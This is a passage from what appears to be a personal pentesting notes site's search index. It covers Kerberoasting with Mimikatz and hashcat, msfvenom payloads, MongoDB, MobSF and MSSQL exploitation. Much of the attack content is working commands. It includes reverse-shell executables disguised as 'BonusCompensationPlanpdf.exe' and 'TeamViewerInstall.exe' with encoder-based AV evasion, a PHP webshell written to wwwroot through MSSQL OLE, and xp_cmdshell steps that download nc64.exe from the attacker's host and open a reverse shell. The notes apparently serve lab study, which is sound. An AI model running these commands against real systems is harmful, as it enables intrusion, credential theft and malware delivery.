services\n\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\"\n#  New-Object cmdlet to create an instance of a .NET Framework object.\n# System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token \n# -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433\": pass the SPN name to the class to request a Kerberos TGS ticket\n</code></pre> <p>3. If needed, we could also retrieve all tickets:</p> <pre><code>setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }\n</code></pre> <p>4. Extract Tickets from Memory with Mimikatz</p> <pre><code># Launch mimikatz\nmimikatz.exe\n\n# Specify base64\nbase64 /out:true\n# If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files.\n\n# Export the tickets\nkerberos::list /export \n</code></pre> <p>5. Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.</p> <pre><code>echo \"&lt;base64 blob&gt;\" |  tr -d \\\\n \n</code></pre> <p>6. We can place the above single line of output into a file and convert it back to a\u00a0<code>.kirbi</code>\u00a0file using the\u00a0<code>base64</code>\u00a0utility.</p> <pre><code>cat encoded_file | base64 -d &gt; sqldev.kirbi\n</code></pre> <p>7. Use kirbi2john.py:</p> <pre><code>python2.7 kirbi2john.py Filename.kirbi\n</code></pre> <p>This will create a file called\u00a0<code>crack_file</code>. We then must modify the file a bit to be able to use Hashcat against the hash.</p> <pre><code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; ServiceName_tgs_hashcat\n</code></pre> <p>8. Cracking the Hash with Hashcat</p> <pre><code>hashcat -m 13100 ServiceName_tgs_hashcat /usr/share/wordlists/rockyou.txt \n</code></pre> <p>If we decide to skip the base64 output with Mimikatz and type\u00a0<code>mimikatz # kerberos::list /export</code>, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run\u00a0<code>kirbi2john.py</code>\u00a0against them directly, skipping the base64 decoding step.</p>","tags":["windows","dump hashes","passwords","pass the hash attack"]},{"location":"mitm-relay/","title":"mitm_relay","text":"<p>Hackish way to intercept and modify non-HTTP protocols through Burp &amp; others with support for SSL and STARTTLS interception</p> <p>This script is a very simple, quick and easy way to MiTM any arbitrary protocol through existing traffic interception software such as Burp Proxy or\u00a0Proxenet. It can be particularly useful for thick clients security assessments. It saves you from the pain of having to configure specific setup to intercept exotic protocols, or protocols that can't be easily intercepted. TCP and UDP are supported.</p> <p>It's \"hackish\" in the way that it was specifically designed to use interception and modification capabilities of existing proxies, but for arbitrary protocols. In order to achieve that, each client request and server response is wrapped into the body of a HTTP POST request, and sent to a local dummy \"echo-back\" web server via the proxy. Therefore, the HTTP responses or headers that you will see in your intercepting proxy are meaningless and can be disregarded. Yet the dummy web server is necessary in order for the interception tool to get the data back and feed it back to the tool.</p> <ul> <li>The requests from client to server will appear as a request to a URL containing \"CLIENT_REQUEST\"</li> <li>The responses from server to client will appear as a request to a URL containing \"SERVER_RESPONSE\"</li> </ul> <p>This way, it is completely asynchronous. Meaning that if the server sends responses in successive packets it won't be a problem.</p> <p>To intercept only server responses, configure your interception rules like so:</p> <p></p> <p>\"Match and Replace\" rules can be used. However, using other Burp features such as repeater, intruder or scanner is pointless. That would only target the dummy webserver used to echo the data back.</p> <p>The normal request traffic flow during typical usage would be as below:</p> <p></p>","tags":["windows","thick applications"]},{"location":"mitm-relay/#installation","title":"Installation","text":"<p>Download from GitHub - jrmdev/mitm_relay: Hackish way to intercept and modify non-HTTP protocols through Burp &amp; others.</p>","tags":["windows","thick applications"]},{"location":"mitm-relay/#requirements","title":"Requirements","text":"<p>1. mitm_relay requires python 3. Also to make sure that it doesn't have a conflict with pip module, we can use version 3.7.6. Download from: https://www.python.org/ftp/python/3.7.6/python-3.7.6-amd64.exe and install it. Once installed, restart the system.</p> <p>2. Also, we can run in some problems like not having some modules installed, To get them installed, we would need to download getpip.py from https://github.com/amandaguglieri/python/blob/main/getpip.py </p> <p>After installing pip, to install a module, run:</p> <pre><code>python -m pip install &lt;nameofmodule&gt;\n</code></pre>","tags":["windows","thick applications"]},{"location":"mmc-console/","title":"Microsoft Management Console (MMC)","text":"<p>You use Microsoft Management Console (MMC) to create, save and open administrative tools, called consoles, which manage the hardware, software, and network components of your Microsoft Windows operating system.</p> <p>We can also open the MMC Console from a non-domain joined computer using the following command syntax:</p> <pre><code>runas /netonly /user:Domain_Name\\Domain_USER mmc\n</code></pre> <p>Now, you will have the MMC interface:</p> <p></p> <p>We can add any of the RSAT snap-ins and enumerate the target domain in the context of the target user sally.jones in the freightlogistics.local domain. After adding the snap-ins, we will get an error message that the \"specified domain either does not exist or could not be contacted.\" From here, we have to right-click on the Active Directory Users and Computers snap-in (or any other chosen snap-in) and choose Change Domain.</p> <p></p> <p>Type the target domain into the <code>Change domain</code> dialogue box, here <code>freightlogistics.local</code>. From here, we can now freely enumerate the domain using any of the AD RSAT snapins.</p>","tags":["active directory","ldap","windows"]},{"location":"mobsf/","title":"Mobile Security Framework - MobSF","text":"<p>Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis. MobSF supports mobile app binaries (APK, XAPK, IPA &amp; APPX) along with others</p>","tags":["mobile pentesting"]},{"location":"mobsf/#installation","title":"Installation","text":"<ol> <li>Install Git using below provided command in terminal</li> </ol> <pre><code>sudo apt-get install git\n</code></pre> <ol> <li>Install Python 3.8/3.9 using below provided command</li> </ol> <pre><code>sudo apt-get install python3.8**\n</code></pre> <ol> <li>Install latest version of JDK</li> </ol> <p>Download from: https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html</p> <p>Then:  <pre><code>chmod +x jdk-6u45-linux-x64.bin\nsh jdk-6u45-linux-x64.bin      \n</code></pre></p> <ol> <li>Install the required dependencies using below provided command</li> </ol> <pre><code>sudo apt install python3-dev python3-venv python3-pip build-essential libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg62-turbo-dev zlib1g-dev wkhtmltopdf\n</code></pre> <ol> <li>Download MobSF using below provided command</li> </ol> <pre><code>git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git\n</code></pre> <p>Setup MobSF using command:</p> <pre><code>sudo ./setup.sh\n</code></pre> <p>Run!</p> <pre><code>./run.sh 127.0.0.1:8000\n\n# Note: we can use any port number instead of **8000**, but it must be available\n</code></pre> <p>Access the MobSF web interface in browser using the URL: http://127.0.0.1:8000</p>","tags":["mobile pentesting"]},{"location":"mongo/","title":"Mongo","text":"<p>By default, mongo uses  TCP ports 27017-27018. </p>","tags":["database","database","NoSQL"]},{"location":"mongo/#to-connect-to-a-mongodb","title":"To connect to a MongoDB","text":"<p>By default mongo does not require password. Admin is a common mongo database default admin user.</p> <pre><code>mongo $ip\nmongo &lt;HOST&gt;:&lt;PORT&gt;\nmongo &lt;HOST&gt;:&lt;PORT&gt;/&lt;DB&gt;\nmongo &lt;database&gt; -u &lt;username&gt; -p '&lt;password&gt;'\n</code></pre> <p>A collection is a group of documents in the database.</p>","tags":["database","database","NoSQL"]},{"location":"mongo/#basic-usage","title":"Basic usage","text":"<pre><code># Enter in mongodb application\nmongo\n\n# See help\nhelp\n\n# Display databases\nshow dbs\n\n# Select a database\nuse &lt;db&gt;\n\n# Display collections in a database\nshow collections\n\n# Dump a collection\ndb.&lt;collection&gt;.find()\n\n# Return the number of records of the collection\ndb.&lt;collection&gt;.count() \n\n# Find in current db the username admin\ndb.current.find({\"username\":\"admin\"}) \n\n# Find in city collection all cities that matches the criteria (= MA) and return the count\ndb.city.find({\"city\":\"MA\"}).count() \n\n# How many cities of state \u201cIndiana\u201d have population greater than 15000 in collection \u201ccity\u201d in database \u201ccity\u201d?\ndb.city.find({$and:[{\"state\":\"IN\"}, {\"pop\":{$gt:15000}}]}).count()\n\n\n####################\n# Operators\n####################\n# Greater than: $gt\ndb.city.find({\"population\":{$gt:150000}}).count() \n\n# And operator: $and\ndb.city.find({$and:[{population:{$gt:150000}},{\"state\":\"FLORIDA\"}]})\n\n# Or operator: $or\ndb.city.find({$or:[{population:{$lt:1000}},{\"state\":\"FLORIDA\"}]})\n\n# Not equal operator: $ne\n# equal operator: $e\n\n# Additionally, you can use regex: Cities that starts with HA: \ndb.city.find({\"city\":{$regex:\"^HA.*\"}})\n\n# What is the name of 101st city in collection \u201ccity\u201d when sorted in ascending order according to \u201ccity\u201d in database \u201ccity\u201d?\ndb.city.find().sort({\"city\":1}).skip(100).limit(1)\n\n#####################\n# Operations\n#####################\n# Perform an average on an aggregate of documents\ndb.city.aggregate({\"$group\":{\"_id\":null, avg:{$avg:{\"$population\"}} }})\n\n\n# We can dump the contents of the documents present in the flag collection by using the db.collection.find() command. Let's replace the collection name flag in the command and also use pretty() in order to receive the output in a beautified format.\n</code></pre>","tags":["database","database","NoSQL"]},{"location":"moodlescan/","title":"moodlescan","text":"<p>my eval: I'm not sure about how accurate it is. I was working on the Goldeneye1 machine from vulnhub and moodlescan identied the moodle version as 2.2.2 when in reality is 2.2.3.  </p>","tags":["pentesting","web pentesting","cms","moodle"]},{"location":"moodlescan/#installation","title":"Installation","text":"<p>Requirements: Install Python 3 and Install the package python3-pip</p> <pre><code>git clone https://github.com/inc0d3/moodlescan\ncd moodlescan\npip install -r requirements.txt\n</code></pre>","tags":["pentesting","web pentesting","cms","moodle"]},{"location":"moodlescan/#basic-commands","title":"Basic commands","text":"<pre><code>python moodlescan.py -u [URL]\n\n\n#Options\n#       -u [URL]    : URL with the target, the moodle to scan\n#       -a      : Update the database of vulnerabilities to latest version\n#       -r      : Enable HTTP requests with random user-agent\n#       -k      : Ignore SSL Certificate\n#       Proxy configuration\n#\n#       -p [URL]    : URL of proxy server (http)\n#       -b [user]   : User for authenticate to proxy server\n#       -c [password]   : Password for authenticate to proxt server\n#       -d [protocol]  : Protocol of authentication: basic or ntlm\n</code></pre>","tags":["pentesting","web pentesting","cms","moodle"]},{"location":"msfvenom/","title":"msfvenom","text":"<p>MSFVenom is the successor of MSFPayload and MSFEncode, two stand-alone scripts that used to work in conjunction with msfconsole to provide users with highly customizable and hard-to-detect payloads for their exploits.</p> <p>You can generate a webshell by using\u00a0 msfvenom</p> <pre><code># List payloads\nmsfvenom --list payloads | grep x64 | grep linux | grep reverse\u00a0\u00a0\n\n# list all the available payloads\nmsfvenom -l payloads  \n</code></pre> <p>Also msfvenom can use metasploit payloads under \u201ccmd/unix\u201d  to generate one-liner bind or reverse shells. List options with:</p> <pre><code>msfvenom -l payloads | grep \"cmd/unix\" | awk '{print $1}'\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"msfvenom/#some-flags","title":"Some flags","text":"<pre><code># -b, or --bad-chars: The list of characters to avoid example: '0'\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"msfvenom/#single-payload","title":"Single  payload","text":"<p><code>Singles</code>\u00a0are self-contained payloads. Some exploits will not support the resulting size of these payloads as they can get quite large.</p>","tags":["pentesting","terminal","shells"]},{"location":"msfvenom/#staged-payload","title":"Staged payload","text":"<pre><code># Example of a linux staged payload\nmsfvenom -p linux/x64/shell/reverse_tcp lhost=192.66.166.2 lport=443 -f elf -o newfile\n\n# Example of a windows staged payload\nmsfvenom -p windows/x64/meterpreter/bind_tcp lhost=10.10.14.72 lport=1234 -f aspx -o lal\n</code></pre> <p>After that</p> <pre><code>chmod +x newfile\u00a0\n</code></pre> <p>When creating a staged payload, you will need to use a metasploit handler (exploit/multi/handler) in order to receive the shell connection as only metasploit contains proper logic that will send the rest of the payload to the connector . In that case, the metasploit payload has to be the same one as the MSFVenom one.</p>","tags":["pentesting","terminal","shells"]},{"location":"msfvenom/#stagedless-payload","title":"Stagedless payload","text":"<p>A stage less payload is a standalone program that does not need anything adittional (no metasploit connection), just the netcat listener on the computer.</p> <pre><code># Example of a windows stageless payload\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe &gt; BonusCompensationPlanpdf.exe\n</code></pre> <p>If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.</p>","tags":["pentesting","terminal","shells"]},{"location":"msfvenom/#crafting-a-dll-file-with-a-webshell","title":"crafting a DLL file with a webshell","text":"<p>The\u00a0<code>Meterpreter</code>\u00a0payload is a specific type of multi-faceted payload that uses\u00a0<code>DLL injection</code>\u00a0to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes.</p> <p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IPAttacker&gt; LPORT=&lt;4444&gt; -a x86 -f dll &gt; SECUR32.dll\n# -p: for the chosen payload\n# -a: architecture in the victim machine/application\n# -f: format for the output file\n</code></pre> More about DLL highjacking in thick client applications.</p>","tags":["pentesting","terminal","shells"]},{"location":"msfvenom/#crafting-a-exe-file-with-shikata-ga-nai-encoder","title":"crafting a .exe file with Shikata Ga Nai encoder","text":"<pre><code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe\n# -e: chosen encoder \n</code></pre> <p>Shikata Ga Nai encoder will be most likely detected by AV and IDS/IPS. One better option would be to try running it through multiple iterations of the same Encoding scheme:</p> <pre><code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe\n</code></pre> <p>But, still, we could be getting detected.</p>","tags":["pentesting","terminal","shells"]},{"location":"msfvenom/#module-msf-virustotal","title":"Module msf-virustotal","text":"<p>Alternatively, Metasploit offers a tool called msf-virustotal that we can use with an API key to analyze our payloads. However, this requires free registration on VirusTotal.</p> <pre><code>msf-virustotal -k &lt;API key&gt; -f TeamViewerInstall.exe\n</code></pre>","tags":["pentesting","terminal","shells"]},{"location":"msfvenom/#packers","title":"Packers","text":"<p>The term <code>Packer</code> refers to the result of an <code>executable compression</code> process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all of the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure.</p> <p>A list of popular packer software:</p> UPX packer The Enigma Protector MPRESS Alternate EXE Packer ExeStealth Morphine MEW Themida <p>If we want to learn more about packers, please check out the PolyPack project.</p>","tags":["pentesting","terminal","shells"]},{"location":"msfvenom/#mitical-attacks","title":"Mitical attacks","text":"Vulnerability Description <code>MS08-067</code> MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability. <code>Eternal Blue</code> MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host. <code>PrintNightmare</code> A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it here. <code>BlueKeep</code> CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2. <code>Sigred</code> CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller. <code>SeriousSam</code> CVE 2021-36924 exploits an issue with the way Windows handles permission on the <code>C:\\Windows\\system32\\config</code> folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials. <code>Zerologon</code> CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft\u2019s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.","tags":["pentesting","terminal","shells"]},{"location":"mssql/","title":"MSSQL - Microsoft SQL Server","text":"<p>Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications\u2014which may run either on the same computer or on another computer across a network. Wikipedia.</p> <p>By default, MSSQL uses ports\u00a0<code>TCP/1433</code>\u00a0and\u00a0<code>UDP/1434</code>. \u00a0However, when MSSQL operates in a \"hidden\" mode, it uses the\u00a0<code>TCP/2433</code>\u00a0port.</p>","tags":["database","cheat sheet"]},{"location":"mssql/#mssql-databases","title":"MSSQL Databases","text":"<p>MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server.</p> Default System Database Description <code>master</code> Tracks all system information for an SQL server instance <code>model</code> Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database <code>msdb</code> The SQL Server Agent uses this database to schedule jobs &amp; alerts <code>tempdb</code> Stores temporary objects <code>resource</code> Read-only database containing system objects included with SQL server <p>Table source: System Databases Microsoft Doc and HTB Academy</p>","tags":["database","cheat sheet"]},{"location":"mssql/#authentication-mechanisms","title":"Authentication Mechanisms","text":"<p>MSSQL supports two authentication modes, which means that users can be created in Windows or the SQL Server:</p> <ul> <li>Windows authentication mode: This is the default, often referred to as integrated security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.</li> <li>Mixed mode: Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.</li> </ul>","tags":["database","cheat sheet"]},{"location":"mssql/#mssql-clients","title":"MSSQL Clients","text":"<ul> <li>SQL Server Management Studio (<code>SSMS</code>) comes as a feature that can be installed with the MSSQL install package or can be downloaded &amp; installed separately</li> <li>mssql-cli</li> <li>SQL Server PowerShell|</li> <li>HediSQL</li> <li>SQLPro</li> <li>Impacket's mssqlclient.py To locate it:</li> </ul> <pre><code>locate mssqlclient\n</code></pre> <p>Of the MSSQL clients listed above, pentesters may find Impacket's mssqlclient.py to be the most useful due to SecureAuthCorp's Impacket project being present on many pentesting distributions at install.</p>","tags":["database","cheat sheet"]},{"location":"mssql/#database-configuration","title":"Database configuration","text":"<p>When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as <code>NT SERVICE\\MSSQLSERVER</code>. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.</p> <p>Authentication being set to <code>Windows Authentication</code> means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system.</p> <p>Misconfigurations to look at:</p> <ul> <li>MSSQL clients not using encryption to connect to the MSSQL server.    </li> <li>The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates   </li> <li>The use of named pipes</li> <li>Weak &amp; default <code>sa</code> credentials. Admins may forget to disable this account.## </li> </ul> <p>The SA password for SQL Server is the SQL Administrator account built into the program.\u00a0 The SA\u00a0password is established during the installation of SQL Server.</p>","tags":["database","cheat sheet"]},{"location":"mssql/#interact-with-mssql","title":"Interact with MSSQL","text":"","tags":["database","cheat sheet"]},{"location":"mssql/#from-linux","title":"From Linux","text":"","tags":["database","cheat sheet"]},{"location":"mssql/#sqsh","title":"sqsh","text":"<p>If we are targetting\u00a0<code>MSSQL</code>\u00a0from Linux, we can use\u00a0<code>sqsh</code>\u00a0as an alternative to\u00a0<code>sqlcmd</code>:  sqsh</p> <pre><code>sqsh -S $IP -U username -P Password123 -h\n# -h: disable headers and footers for a cleaner look.\n\n# When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication.\nsqsh -S $ip -U .\\\\&lt;username&gt; -P 'MyPassword!' -h\n# For windows authentication we can use  SERVERNAME\\\\accountname or .\\\\accountname\n</code></pre>","tags":["database","cheat sheet"]},{"location":"mssql/#mssqlclientpy-from-impacket","title":"mssqlclient.py from impacket","text":"<pre><code>mssqlclient.py -p $port username@$ip \n</code></pre> <p>If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (<code>Transact-SQL</code>). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.</p> <pre><code>python3 mssqlclient.py Administrator@$ip -windows-auth  \n# With python3 mssqlclient.py help you can see more options.\n</code></pre>","tags":["database","cheat sheet"]},{"location":"mssql/#from-windows","title":"From Windows","text":"<p>sqlcmd\u00a0 |  Guide</p> <p>The\u00a0<code>sqlcmd</code>\u00a0utility lets you enter Transact-SQL statements, system procedures, and script files through a variety of available modes:</p> <ul> <li>At the command prompt.</li> <li>In Query Editor in SQLCMD mode.</li> <li>In a Windows script file.</li> <li>In an operating system (Cmd.exe) job step of a SQL Server Agent job.</li> </ul> <p>Careful. In some environments the command GO needs to be in lowercase.</p> <pre><code>sqlcmd -S $IP -U username -P Password123\n</code></pre>","tags":["database","cheat sheet"]},{"location":"mssql/#gui-application","title":"GUI Application","text":"<p>mssql-cli, mssqlclient.py, dbeaver </p>","tags":["database","cheat sheet"]},{"location":"mssql/#sql-server-management-studio-or-ssms","title":"SQL Server Management Studio or SSMS","text":"<p>Only in windows. Download, install, and connect to database. </p>","tags":["database","cheat sheet"]},{"location":"mssql/#dbeaver","title":"dbeaver","text":"<p>dbeaver is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.</p> <pre><code># Install dbeaver\nsudo dpkg -i dbeaver-&lt;version&gt;.deb\n\n# Run dbeaver\ndbeaver &amp;\n\n# Once we have access to the database using a command-line utility or a GUI application, we can use common\u00a0[Transact-SQL statements](https://docs.microsoft.com/en-us/sql/t-sql/statements/statements?view=sql-server-ver15)\u00a0to enumerate databases and tables containing sensitive information such as usernames and passwords.\n</code></pre>","tags":["database","cheat sheet"]},{"location":"mssql/#mssqlclientpy-from-impacket_1","title":"mssqlclient.py from impacket","text":"<p>Alternatively, we can use the tool from Impacket with the name\u00a0<code>mssqlclient.py</code>.</p> <pre><code>mssqlclient.py -p $port username@$ip \n</code></pre> <p>If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (<code>Transact-SQL</code>). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.</p> <pre><code>python3 mssqlclient.py Administrator@$ip -windows-auth  \n# With python3 mssqlclient.py help you can see more options.\n</code></pre>","tags":["database","cheat sheet"]},{"location":"mssql/#basic-commands","title":"Basic commands","text":"<pre><code># Get Microsoft SQL server version\nselect @@version;\n\n# Get usernames\nselect user_name()\ngo \n\n# We need to use GO after our query to execute the SQL syntax. \n# List databases\nSELECT name FROM master.dbo.sysdatabases\ngo\n\n# Select a database\nUSE $dbName\ngo\n## Examples: Select a database master\n## USE master\n\n# Check out which one is the current selected database\nSELECT DB_NAME()\ngo\n\n# Show tables\nSELECT table_name FROM $dbName.INFORMATION_SCHEMA.TABLES\ngo\n\n# Select a database and show content of a specific table.  \nUSE $dbName\nSELECT * FROM $tableName \n\n# Example: Select all Data from Table \"users\". The name of the table (\"users\") was obtained when running the command for showing the tables.\nSELECT * FROM users\ngo\n\n# Get a list of users in the domain\nSELECT name FROM master..syslogins\ngo\n\n# Get a list of users that are sysadmins\nSELECT name FROM master..syslogins WHERE sysadmin = 1\ngo\n\n# And to make sure: \nSELECT is_srvrolemember('sysadmin')\ngo\n# If your user is admin, it will return 1.\n</code></pre> <p>Also, you might be interested in executing a cmd shell using xp_cmdshell by reconfiguring sp_configure (see the section <code>Executing cmd shell in a SQL command line</code>).</p>","tags":["database","cheat sheet"]},{"location":"mssql/#write-files-using-mssql","title":"Write files using MSSQL","text":"<p>To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:</p> <pre><code>sp_configure 'show advanced options', 1;\nRECONFIGURE;\nsp_configure 'Ole Automation Procedures', 1;\nRECONFIGURE;\n</code></pre>","tags":["database","cheat sheet"]},{"location":"mssql/#create-files-using-mssql","title":"Create files using MSSQL","text":"<pre><code># Using MSSQL to Create a File\nDECLARE @OLE INT;\nDECLARE @FileID INT;\nEXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;\nEXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1;\nEXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '&lt;?php echo shell_exec($_GET[\"c\"]);?&gt;';\nEXECUTE sp_OADestroy @FileID;\nEXECUTE sp_OADestroy @OLE;\n</code></pre>","tags":["database","cheat sheet"]},{"location":"mssql/#read-files-using-mssql","title":"Read files using MSSQL","text":"<pre><code>SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents\n</code></pre>","tags":["database","cheat sheet"]},{"location":"mssql/#executing-cmd-shell-in-a-sql-command-line","title":"Executing cmd shell in a SQL command line","text":"<p>Our goal can be to spawn a Windows command shell and pass in a string for execution. For that Microsoft SQL syntaxis has the command xp_cmdshell, that will allow us to use the SQL command line as a CLI. </p> <p>Because malicious users sometimes attempt to elevate their privileges by using xp_cmdshell, xp_cmdshell is disabled by default. \u00a0<code>xp_cmdshell</code>\u00a0can be enabled and disabled by using the\u00a0Policy-Based Management\u00a0or by executing\u00a0sp_configure</p> <p>sp_configure displays or changes global configuration settings for the current settings. This is how you may take advantage of it:</p> <pre><code># To allow advanced options to be changed.   \nEXECUTE sp_configure 'show advanced options', 1\ngo\n\n# To update the currently configured value for advanced options.  \nRECONFIGURE\ngo\n\n# To enable the feature.  \nEXECUTE sp_configure 'xp_cmdshell', 1\ngo\n\n# To update the currently configured value for this feature.  \nRECONFIGURE\ngo\n</code></pre> <p>Note:  The Windows process spawned by\u00a0<code>xp_cmdshell</code>\u00a0has the same security rights as the SQL Server service account</p> <p>Now we can use the MSSQL terminal to execute commands:</p> <pre><code># Who am i?\nxp_cmdshell 'whoami'\ngo\n\n# This will return the .exe files existing in the current directory\nEXEC xp_cmdshell 'dir *.exe'\ngo\n\n# To print a file\nEXECUTE xp_cmdshell 'type c:\\Users\\sql_svc\\Desktop\\user.txt\ngo\n\n# With this (and a \"python3 -m http.server 80\" from our kali serving a file) we can upload a file to the attacked machine, for instance a reverse shell like nc64.exe\nxp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; wget http://IPfromOurKali/nc64.exe -outfile nc64.exe\"\ngo\n\n# We could also bind this cmd.exe through the nc to our listener. For that open a different tab in kali and do a \"nc -lnvp 443\". When launching the reverse shell, we'll get a powershell terminal in this tab by running:\nxp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; .\\nc64.exe -e cmd.exe IPfromOurKali 443\";\n# You could also upload winPEAS and run it from this powershell command line\n</code></pre> <p>There are other methods to get command execution, such as adding\u00a0extended stored procedures,\u00a0CLR Assemblies,\u00a0SQL Server Agent Jobs, and\u00a0external scripts.</p>","tags":["database","cheat sheet"]},{"location":"my-mkdocs-material-customization/","title":"mkdocs","text":"<p>MkDocs is a static site generator for building project documentation. Documentation source files are written in Markdown, and configured with a single YAML configuration file.</p> <p>I chose mkdocs to build the site because of its simplicity.  </p> <p>Link to site.</p> <p>Some other options: hugo.</p>"},{"location":"my-mkdocs-material-customization/#my-install","title":"My install","text":"<p>Install a virtual environment such as virtualenvwrapper. </p> <p>Create your virtual environment and activate it:</p> <pre><code>mkvirtualenv hackinglife\n\nworkon hackinglife\n</code></pre> <p>Install mkdocs. It's version 1.5.3. in my case:</p> <pre><code>pip install mkdocs==1.5.3\n</code></pre> <p>Install material theme for mkdocs: </p> <pre><code>pip install mkdocs-material\n</code></pre> <p>Install plugins such as glightbox:</p> <pre><code>pip install mkdocs-glightbox\n</code></pre> <p>Install plugins such as \"git-revision-date-localized\"</p> <pre><code>pip3 install mkdocs-git-revision-date-localized-plugin\n</code></pre> <p>Install plugins such as \"mkdocs-pdf-export\"</p> <pre><code>pip install mkdocs-pdf-export-plugin\n</code></pre>"},{"location":"my-mkdocs-material-customization/#customizing-material-theme-pluggins-and-extensions","title":"Customizing Material theme: pluggins and extensions","text":"<p>Some plugins like \"mkdocs-glightbox\", \"mkdocs-git-revision-date-localized-plugin\", or \"mkdocs-pdf-export-plugin\", need to be added when the web app is deployed, so for that reason they are added at .github/workflow/doc.yml. </p> <p>But some other pluggings just need to be added in the mkdocs configuration file (mkdocs.yml) like this:</p> <pre><code>markdown_extensions:\n    - 